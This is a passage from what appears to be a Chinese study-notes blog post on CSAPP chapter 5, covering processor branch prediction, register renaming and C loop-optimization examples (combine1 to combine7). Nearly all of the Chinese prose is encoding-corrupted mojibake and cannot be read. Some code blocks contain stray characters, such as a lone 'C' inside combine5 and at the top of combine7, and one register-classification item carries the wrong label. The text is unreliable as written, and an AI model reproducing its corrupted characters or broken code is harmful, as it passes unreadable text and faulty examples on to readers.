EUã€‚</p><p>ç¨‹åºé‡åˆ°åˆ†æ”¯æ—¶ï¼Œæœ‰é€‰æ‹©åˆ†æ”¯å’Œä¸é€‰æ‹©åˆ†æ”¯ä¸¤ç§å¯èƒ½ã€‚åœ¨â€å–æŒ‡æ§åˆ¶â€œæ¨¡å—ï¼Œç°ä»£å¤„ç†å™¨é‡‡ç”¨<strong>åˆ†æ”¯é¢„æµ‹</strong>çš„æŠ€æœ¯ï¼Œå¤„ç†å™¨ä¸ä»…ä¼šçŒœæµ‹æ˜¯å¦ä¼šé€‰æ‹©åˆ†æ”¯ï¼Œè¿˜ä¼šé¢„æµ‹åˆ†æ”¯çš„ç›®æ ‡åœ°å€ã€‚</p><p>åœ¨è¿™åŸºç¡€ä¸Šï¼Œç¨‹åºä½¿ç”¨<strong>æŠ•æœºæ‰§è¡Œ</strong>çš„æŠ€æœ¯ï¼Œå¤„ç†å™¨å–å‡ºé¢„æµ‹çš„åˆ†æ”¯ä¼šè·³åˆ°çš„æŒ‡ä»¤ï¼Œè¿›è¡ŒæŒ‡ä»¤è¯‘ç ï¼Œåœ¨ç¡®å®šåˆ†æ”¯ä¹‹å‰å°±å¼€å§‹æ‰§è¡Œã€‚å¦‚æœä¹‹åç¡®å®šåˆ†æ”¯é¢„æµ‹é”™è¯¯ï¼Œä¼šå°†çŠ¶æ€é‡ç½®åˆ°åˆ†æ”¯ç‚¹ï¼Œå–å‡ºå¹¶æ‰§è¡Œå¦ä¸€ä¸ªæ–¹å‘ä¸Šçš„æŒ‡ä»¤ï¼Œè¿™ä¸ªæ­¥éª¤ä¼šé€ æˆæ€§èƒ½æŸè€—ã€‚</p><p><strong>æŒ‡ä»¤è¯‘ç </strong>æ¥æ”¶ç¨‹åºæŒ‡ä»¤ï¼Œå°†ä»–ä»¬è½¬æ¢æˆä¸€ç»„åŸºæœ¬æ“ä½œï¼ˆå¾®æ“ä½œï¼‰ï¼Œä¾‹å¦‚ä¸¤ä¸ªæ•°ç›¸åŠ ï¼Œä»å†…å­˜è¯»æ•°æ®ï¼Œå‘å†…å­˜å†™æ•°æ®ã€‚é€šå¸¸,ä¸€æ¡åªå¯¹å¯„å­˜å™¨æ“ä½œçš„æŒ‡ä»¤ä¼šè¢«è½¬æ¢æˆä¸€ä¸ªæ“ä½œï¼Œä¾‹å¦‚ <code>addq %rax, %rdx</code> å°†ä¼šè½¬æ¢æˆåŠ æ³•æ“ä½œï¼›è€ŒåŒ…æ‹¬å†…å­˜å¼•ç”¨çš„æŒ‡ä»¤å°†è½¬æ¢æˆå¤šä¸ªæ“ä½œï¼Œå°†å†…å­˜å¼•ç”¨å’Œç®—æœ¯è¿ç®—åˆ†æ¥ï¼Œä¾‹å¦‚ <code>addq %rax, 8(%rdx)</code>ï¼Œå°†ä¼šè½¬æ¢æˆ 3 ä¸ªæ­¥éª¤ï¼šåŠ è½½ï¼ŒåŠ æ³•ï¼Œå­˜å›ã€‚æ‰§è¡Œå•å…ƒå¯ä»¥å¹¶è¡Œæ‰§è¡Œè¿™ç±»å¤šæ¡æŒ‡ä»¤çš„ä¸åŒéƒ¨åˆ†ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼ŒICUä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„å•å…ƒï¼š</p><ul><li><strong>åŠŸèƒ½å•å…ƒ</strong>ï¼šEUæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸå¯ä»¥æ¥æ”¶å¤šä¸ªæ¥è‡ªå–æŒ‡å•å…ƒçš„æ“ä½œï¼Œæ¯ä¸ªåŠŸèƒ½å•å…ƒå¯ä»¥æ‰§è¡Œå¤šç§ä¸åŒçš„æ“ä½œã€‚</li><li><strong>é€€å½¹å•å…ƒretirement unit</strong>ï¼šåœ¨é˜Ÿåˆ—ä¸­è®°å½•æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤çš„ä¿¡æ¯ï¼Œç¡®ä¿ä¹±åºæ‰§è¡Œçš„ç»“æœéµå®ˆæœºå™¨çº§ç¨‹åºçš„é¡ºåºè¯­ä¹‰ã€‚é€€å½¹å•å…ƒæ§åˆ¶å¯„å­˜å™¨çš„æ›´æ–°ï¼Œä¸€æ—¦ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œå®Œæˆï¼Œå¹¶ä¸”<strong>åˆ†æ”¯é¢„æµ‹</strong>çš„ç»“æœè¢«ç¡®è®¤ä¸ºé¢„æµ‹æ­£ç¡®ï¼Œé‚£ä¹ˆè¿™æ¡æŒ‡ä»¤å¯ä»¥é€€å½¹(retire)ï¼Œå¯¹å¯„å­˜å™¨çš„æ›´æ–°å¯ä»¥è¢«æ‰§è¡Œï¼Œå¦åˆ™è¿™æ¡æŒ‡ä»¤è¢«æ¸…ç©º(flushed)ï¼Œå¹¶ä¸”ä¸¢å¼ƒè®¡ç®—çš„ç»“æœã€‚</li></ul><p>æ§åˆ¶æ“ä½œæ•°åœ¨æ‰§è¡Œå•å…ƒé—´ä¼ é€çš„æœ€å¸¸è§çš„æœºåˆ¶ç§°ä¸º<strong>å¯„å­˜å™¨é‡å‘½å</strong>ã€‚å¯¹å¯„å­˜å™¨çš„æ›´æ–°åªæœ‰åœ¨æŒ‡ä»¤é€€å½¹æ—¶æ‰ä¼šæ‰§è¡Œï¼Œåœ¨æ‰§è¡Œå•å…ƒé—´ä¼ é€æŒ‡ä»¤ï¼ˆé€€å½¹ä¹‹å‰ï¼‰éœ€è¦ç”¨åˆ°å¯„å­˜å™¨é‡å‘½åæœºåˆ¶ã€‚</p><blockquote><p>ä¹¦ä¸Šçš„è§£é‡Šçœ‹ä¸æ˜ç™½æˆ‘é—®äº† chatGPTï¼šæŒ‡ä»¤è¢«è§£ç æ—¶ï¼Œå¤„ç†å™¨ä¼šåˆ†é…ä¸€ä¸ªç©ºé—²çš„ç‰©ç†å¯„å­˜å™¨ï¼Œå¹¶å°†è¯¥æŒ‡ä»¤ä¸­æ¶‰åŠåˆ°çš„é€»è¾‘å¯„å­˜å™¨é‡å®šå‘åˆ°è¿™ä¸ªç‰©ç†å¯„å­˜å™¨ã€‚è¿™æ ·å°±å¯ä»¥ç¡®ä¿æŒ‡ä»¤ä¹‹é—´ä¸ä¼šäº’ç›¸å¹²æ‰°ï¼Œä»è€Œæé«˜äº†æŒ‡ä»¤çº§å¹¶è¡Œæ€§ï¼ˆInstruction-Level Parallelismï¼‰ã€‚</p><p>eg:</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%A4%84%E7%90%86%E5%99%A8%E9%87%8D%E5%91%BD%E5%90%8D.png"></p></blockquote><h3 id="åŠŸèƒ½å•å…ƒçš„æ€§èƒ½"><a href="#åŠŸèƒ½å•å…ƒçš„æ€§èƒ½" class="headerlink" title="åŠŸèƒ½å•å…ƒçš„æ€§èƒ½"></a>åŠŸèƒ½å•å…ƒçš„æ€§èƒ½</h3><p>å¤„ç†å™¨æ€§èƒ½ç”±ä»¥ä¸‹å‡ ä¸ªæ•°å€¼åˆ»ç”»ï¼š</p><ul><li>å»¶è¿Ÿï¼šå®ƒè¡¨ç¤ºå®Œæˆè¿ç®—æ‰€éœ€è¦çš„æ€»æ—¶é—´</li><li>å‘å°„æ—¶é—´ï¼šè¡¨ç¤ºä¸¤ä¸ªè¿ç»­çš„åŒç±»å‹çš„è¿ç®—ä¹‹é—´æ‰€éœ€è¦çš„æ€»æ—¶é—´</li><li>å®¹é‡ï¼šè¡¨ç¤ºæ˜¯èƒ½å¤Ÿæ‰§è¡Œè¯¥è¿ç®—çš„åŠŸèƒ½å•ä½çš„æ•°é‡</li></ul><p>å…¶ä¸­ï¼Œè¡¨ç¤ºå‘å°„æ—¶é—´çš„å¦ä¸€ä¸ªå¸¸è§çš„æ–¹æ³•æ˜¯æŒ‡æ˜è¿™ä¸ªåŠŸèƒ½å•ä½çš„æœ€å¤§ååé‡ï¼Œå®šä¹‰ä¸ºå‘å°„æ—¶é—´çš„å€’æ•°ã€‚</p><p>ç®—æœ¯è¿ç®—çš„å»¶è¿Ÿã€å‘å°„æ—¶é—´å’Œå®¹é‡ä¼šå½±å“åˆå¹¶å‡½æ•°çš„æ€§èƒ½ï¼Œæˆ‘ä»¬ç”¨ CPE çš„å€¼çš„ä¸¤ä¸ªåŸºæœ¬ç•Œé™æ¥æè¿°è¿™ç§å½±å“ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%BB%B6%E8%BF%9F%E7%95%8C%E9%99%90.png"></p><p>å»¶è¿Ÿç•Œé™ç»™å‡ºäº†ä»»ä½•å¿…é¡»æŒ‰ç…§ä¸¥æ ¼é¡ºåºå®Œæˆåˆå¹¶è¿ç®—çš„å‡½æ•°æ‰€éœ€è¦çš„æœ€å° CPE å€¼ã€‚ååé‡ç•Œé™ç»™å‡ºäº† CPE çš„æœ€å°ç•Œé™ã€‚</p><h3 id="å¤„ç†å™¨æ“ä½œçš„æŠ½è±¡æ¨¡å‹"><a href="#å¤„ç†å™¨æ“ä½œçš„æŠ½è±¡æ¨¡å‹" class="headerlink" title="å¤„ç†å™¨æ“ä½œçš„æŠ½è±¡æ¨¡å‹"></a>å¤„ç†å™¨æ“ä½œçš„æŠ½è±¡æ¨¡å‹</h3><p>æˆ‘ä»¬ç”¨æ•°æ®æµè¡¨ç¤ºåœ¨ç°åœ¨å¤„ç†å™¨ä¸Šæ‰§è¡Œçš„æœºå™¨åŠç¨‹åºæ€§èƒ½ï¼Œè¿™æ˜¯ä¸€ç§å›¾å½¢åŒ–çš„è¡¨ç¤ºæ–¹æ³•ï¼Œå±•ç°äº†ä¸åŒæ“ä½œä¹‹é—´çš„æ•°æ®ç›¸å…³æ˜¯å¦‚ä½•é™åˆ¶å®ƒä»¬çš„æ‰§è¡Œé¡ºåºçš„ã€‚è¿™äº›é™åˆ¶å½¢æˆäº†éœ€è¦ä¼˜åŒ–çš„å…³é”®è·¯å¾„ï¼Œè¿™æ˜¯æ‰§è¡Œä¸€ç»„æœºå™¨æŒ‡ä»¤æ‰€éœ€æ—¶é’Ÿå‘¨æœŸæ•°çš„ä¸€ä¸ªä¸‹ç•Œã€‚</p><p>ä¾‹å¦‚ï¼šä¸‹å›¾ä¸ºä¹‹å‰ç« èŠ‚ä¸­ combine4 å‡½æ•°çš„å›¾å½¢åŒ–è¡¨ç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L25:<br>vmulsd (%rdx), %xmm0, %xmm0<br>addq $8, %rdx<br>cmpq %rax, %rdx<br>jne .L25<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E6%95%B0%E6%8D%AE%E6%B5%81.png"></p><p>å¯¹äºå½¢æˆå¾ªç¯çš„ä»£ç ç‰‡æ®µï¼Œæˆ‘ä»¬å¯ä»¥å°†è®¿é—®åˆ°çš„å¯„å­˜å™¨åˆ†ä¸ºå››ç±»ï¼š</p><ul><li>åªè¯»ï¼šè¿™äº›å¯„å­˜å™¨åªç”¨ä½œæºå€¼ï¼Œå¯ä»¥ä½œä¸ºæ•°æ®ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥è®¡ç®—å†…å­˜åœ°å€ï¼Œä½†æ˜¯åœ¨å¾ªç¯ä¸­å®ƒä»¬æ˜¯ä¸ä¼šè¢«ä¿®æ”¹çš„ã€‚</li><li>å¾ªç¯ï¼šcombine4 çš„åªè¯»å¯„å­˜å™¨æ˜¯ %raxã€‚</li><li>åªå†™ï¼šè¿™äº›å¯„å­˜å™¨ä½œä¸ºæ•°æ®ä¼ é€æ“ä½œçš„ç›®çš„ã€‚åœ¨æœ¬å¾ªç¯ä¸­æ²¡æœ‰è¿™æ ·çš„å¯„å­˜å™¨ã€‚</li><li>å±€éƒ¨ï¼šè¿™äº›å¯„å­˜å™¨åœ¨å¾ªç¯å†…éƒ¨è¢«ä¿®æ”¹å’Œä½¿ç”¨ï¼Œè¿­ä»£ä¸è¿­ä»£ä¹‹é—´ä¸ç›¸å…³ã€‚åœ¨è¿™ä¸ªå¾ªç¯ä¸­ï¼Œæ¡ä»¶ç å¯„å­˜å™¨å°±æ˜¯ä¾‹å­ï¼Œcmp æ“ä½œä¼šä¿®æ”¹å®ƒä»¬ï¼Œ jne æ“ä½œåˆä¼šä½¿ç”¨å®ƒä»¬ï¼Œä¸è¿‡è¿™ç§ç›¸å…³æ˜¯åœ¨<strong>å•æ¬¡è¿­ä»£</strong>ä¹‹å†…çš„ã€‚</li><li>å¾ªç¯ï¼šå¯¹äºå¾ªç¯æ¥è¯´ï¼Œè¿™äº›å¯„å­˜å™¨æ—¢ä½œä¸ºæºå€¼ï¼Œåˆä½œä¸ºç›®çš„ï¼Œä¸€æ¬¡è¿­ä»£ä¸­äº§ç”Ÿçš„å€¼ä¼šåœ¨å¦ä¸€æ¬¡é€‰ä»£ä¸­ç”¨åˆ°ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ%rdx å’Œ %xmm0æ˜¯ comine4 çš„å¾ªç¯å¯„å­˜å™¨ï¼Œå¯¹åº”äºç¨‹åºå€¼ data+i å’Œ accã€‚</li></ul><h1 id="ä¼˜åŒ–ä»£ç å®Œæ•´ç¤ºä¾‹"><a href="#ä¼˜åŒ–ä»£ç å®Œæ•´ç¤ºä¾‹" class="headerlink" title="ä¼˜åŒ–ä»£ç å®Œæ•´ç¤ºä¾‹"></a>ä¼˜åŒ–ä»£ç å®Œæ•´ç¤ºä¾‹</h1><h3 id="åŸå§‹ä»£ç "><a href="#åŸå§‹ä»£ç " class="headerlink" title="åŸå§‹ä»£ç "></a>åŸå§‹ä»£ç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// OPä¸º+æ—¶IDENTä¸º0</span><br><span class="hljs-comment">// OPä¸º*æ—¶IDENTä¸º1</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">combine1</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    *dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; vec_length(v); i++)<br>    &#123;  <br>        <span class="hljs-comment">// è¿™é‡Œvec_length(v)é‡å¤æ±‚å€¼äº†</span><br>        <span class="hljs-type">data_t</span> val;<br>        get_vec_element(v, i, &amp;val);<br>        *dest = *dest OP val;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡-1"><a href="#æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡-1" class="headerlink" title="æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡"></a>æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡</h3><p>ä¼˜åŒ–æ–¹æ³•ç§°ä¸º<strong>ä»£ç ç§»åŠ¨(code motion)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine2</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);  <span class="hljs-comment">// å°†ä¸å˜çš„é•¿åº¦æ”¾åˆ°å¾ªç¯å¤–</span><br>    *dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        get_vec_element(v, i, &amp;val);<br>        *dest = *dest OP val;<br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å‡å°‘è¿‡ç¨‹è°ƒç”¨-1"><a href="#å‡å°‘è¿‡ç¨‹è°ƒç”¨-1" class="headerlink" title="å‡å°‘è¿‡ç¨‹è°ƒç”¨"></a>å‡å°‘è¿‡ç¨‹è°ƒç”¨</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">data_t</span>* <span class="hljs-title function_">get_vec_start</span><span class="hljs-params">(vec_ptr v)</span>&#123;<span class="hljs-keyword">return</span> v-&gt;data;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">combine3</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);  <span class="hljs-comment">// è·å–æ•°ç»„èµ·å§‹åœ°å€</span><br>    *dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        *dest = *dest OP data[i];  <span class="hljs-comment">// å°†å‡½æ•°è°ƒç”¨get_vec_element(v, i, &amp;val)æ”¹ä¸ºå†…å­˜åç§»é‡</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨-1"><a href="#æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨-1" class="headerlink" title="æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨"></a>æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine4</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc = IDENT;  <span class="hljs-comment">// è®¡ç®—ç»“æœä¿å­˜åœ¨å±€éƒ¨å˜é‡ï¼Œå‡å°‘å†…å­˜å¯»å€æ¬¡æ•°</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest = acc;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¾ªç¯å±•å¼€"><a href="#å¾ªç¯å±•å¼€" class="headerlink" title="å¾ªç¯å±•å¼€"></a>å¾ªç¯å±•å¼€</h3><p>å¾ªç¯å±•å¼€æ˜¯ä¸€ç§ç¨‹åºå˜æ¢ï¼Œé€šè¿‡å¢åŠ æ¯æ¬¡è¿­ä»£è®¡ç®—çš„å…ƒç´ çš„æ•°é‡ï¼Œå‡å°‘å¾ªç¯çš„è¿­ä»£æ¬¡æ•°ã€‚</p><p>å¾ªç¯å±•å¼€èƒ½å¤Ÿä»ä¸¤ä¸ªæ–¹é¢æ”¹è¿›ç¨‹åºçš„æ€§èƒ½ï¼š</p><ul><li>å®ƒå‡å°‘äº†ä¸ç›´æ¥æœ‰åŠ©äºç¨‹åºç»“æœçš„æ“ä½œçš„æ•°é‡ï¼Œä¾‹å¦‚å¾ªç¯ç´¢å¼•è®¡ç®—å’Œæ¡ä»¶åˆ†æ”¯ã€‚</li><li>å®ƒæä¾›äº†ä¸€äº›æ–¹æ³•ï¼Œå¯ä»¥è¿›ä¸€æ­¥å˜åŒ–ä»£ç ï¼Œå‡å°‘æ•´ä¸ªè®¡ç®—ä¸­å…³é”®è·¯å¾„ä¸Šçš„æ“ä½œæ•°é‡ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine5</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);C<br>    <span class="hljs-type">long</span> limit = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc = IDENT;<br><br>    <span class="hljs-comment">// 2x1 å¾ªç¯å±•å¼€</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; limit; i+=<span class="hljs-number">2</span>)<br>    &#123;<br>        acc = (acc OP data[i]) OP data[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (; i &lt; length; i++)<br>    &#123;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest = acc;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æé«˜å¹¶è¡Œæ€§"><a href="#æé«˜å¹¶è¡Œæ€§" class="headerlink" title="æé«˜å¹¶è¡Œæ€§"></a>æé«˜å¹¶è¡Œæ€§</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine6</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">long</span> limit = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc0 = IDENT;  <span class="hljs-comment">// å¤šä¸ªç´¯ç§¯å˜é‡</span><br>    <span class="hljs-type">data_t</span> acc1 = IDENT;<br><br>    <span class="hljs-comment">// 2x2 å¾ªç¯å±•å¼€</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; limit; i+=<span class="hljs-number">2</span>)&#123;<br>        acc0 = acc0 OP data[i];<br>        acc1 = acc1 OP data[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (; i &lt; length; i++)&#123;<br>        acc0 = acc0 OP data[i];<br>    &#125;<br>    *dest = acc0 OP acc1;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œç¨‹åºå·²ç»çªç ´äº†å»¶è¿Ÿç•Œé™ã€‚</p><h3 id="é‡æ–°ç»“åˆå˜æ¢"><a href="#é‡æ–°ç»“åˆå˜æ¢" class="headerlink" title="é‡æ–°ç»“åˆå˜æ¢"></a>é‡æ–°ç»“åˆå˜æ¢</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C">C<br><span class="hljs-type">void</span> <span class="hljs-title function_">combine7</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">long</span> limit = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc = IDENT;<br><br>    <span class="hljs-comment">// 2x1a å¾ªç¯å±•å¼€</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; limit; i+=<span class="hljs-number">2</span>)&#123;<br>        acc = acc OP (data[i] OP data[i+<span class="hljs-number">1</span>]);  <span class="hljs-comment">// é‡æ–°ç»“åˆ</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (; i &lt; length; i++)&#123;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest = acc;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¸€äº›é™åˆ¶å› ç´ "><a href="#ä¸€äº›é™åˆ¶å› ç´ " class="headerlink" title="ä¸€äº›é™åˆ¶å› ç´ "></a>ä¸€äº›é™åˆ¶å› ç´ </h1><h3 id="å¯„å­˜å™¨æº¢å‡º"><a href="#å¯„å­˜å™¨æº¢å‡º" class="headerlink" title="å¯„å­˜å™¨æº¢å‡º"></a>å¯„å­˜å™¨æº¢å‡º</h3><p>å¾ªç¯å¹¶è¡Œæ€§çš„å¥½å¤„å—æ±‡ç¼–ä»£ç æè¿°è®¡ç®—çš„èƒ½åŠ›é™åˆ¶ã€‚å¦‚æœæˆ‘ä»¬çš„å¹¶è¡Œåº¦æˆ·è¶…è¿‡äº†å¯ç”¨çš„å¥‡å­˜å™¨æ•°é‡ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šè¯‰è¯¸**æº¢å‡º(spilling)**ï¼Œå°†æŸäº›ä¸´æ—¶å€¼å­˜æ”¾åˆ°å†…å­˜ä¸­ï¼Œé€šå¸¸æ˜¯åœ¨è¿è¡Œæ—¶å †æ ˆä¸Šåˆ†é…ç©ºé—´ï¼Œé€ æˆæ€§èƒ½ä¸‹é™ã€‚è§£å†³åŠæ³•æ˜¯æ§åˆ¶å¾ªç¯å±•å¼€çš„æ•°é‡ã€‚</p><h3 id="åˆ†æ”¯é¢„æµ‹é”™è¯¯å¤„ç½š"><a href="#åˆ†æ”¯é¢„æµ‹é”™è¯¯å¤„ç½š" class="headerlink" title="åˆ†æ”¯é¢„æµ‹é”™è¯¯å¤„ç½š"></a>åˆ†æ”¯é¢„æµ‹é”™è¯¯å¤„ç½š</h3><p>å½“åˆ†æ”¯é¢„æµ‹é€»è¾‘ä¸èƒ½æ­£ç¡®é¢„æµ‹ä¸€ä¸ªåˆ†æ”¯æ˜¯å¦è¦è·³è½¬çš„æ—¶å€™ï¼Œæ¡ä»¶åˆ†æ”¯å¯èƒ½ä¼šæ‹›è‡´å¾ˆå¤§çš„é¢„æµ‹é”™è¯¯å¤„ç½šã€‚</p><p>è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ul><li><p>ä¸è¦è¿‡åˆ†å…³å¿ƒå¯é¢„æµ‹çš„åˆ†æ”¯</p><p>æ¯”å¦‚ combine4 ä¸­çš„è¾¹ç•Œæ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸ç”¨è¾¹ç•Œæ£€æŸ¥çš„å‡½æ•°ã€‚å¤„ç†å™¨èƒ½å¤Ÿé¢„æµ‹è¿™äº›åˆ†æ”¯çš„ç»“æœï¼Œæ‰€ä»¥è¿™äº›æ±‚å€¼éƒ½ä¸ä¼šå¯¹å½¢æˆç¨‹åºæ‰§è¡Œä¸­å…³é”®è·¯å¾„çš„æŒ‡ä»¤çš„å–æŒ‡å’Œå¤„ç†äº§ç”Ÿå¤ªå¤§çš„å½±å“ã€‚</p></li><li><p>ä¹¦å†™é€‚ç”¨æ¡ä»¶ä¼ é€çš„ä»£ç </p><p>ä½¿ç”¨â€œåŠŸèƒ½æ€§â€ä»£ç ä»£æ›¿â€å‘½ä»¤å¼â€œä»£ç 